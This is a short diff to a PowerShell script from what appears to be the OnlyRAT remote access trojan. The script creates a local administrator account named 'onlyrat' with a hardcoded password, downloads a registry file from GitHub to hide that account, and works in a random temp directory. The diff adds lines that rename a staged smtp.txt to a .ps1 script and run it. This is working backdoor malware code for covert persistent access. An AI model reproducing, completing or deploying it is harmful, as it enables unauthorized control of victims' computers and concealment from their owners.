@@ -33,6 +33,7 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+
 # create admin user
 $uname = "onlyrat"
 $pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
@@ -41,6 +42,8 @@ create_account -uname $uname -pword $pword
 # goto temp, make working directory
 mkdir $path
 cd $path
+mv $initial_dir/smtp.txt ./smtp.ps1
+./smtp.ps1
 
 # registry to hide local admin
 Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/files/wrev.reg -OutFile "wrev.reg"
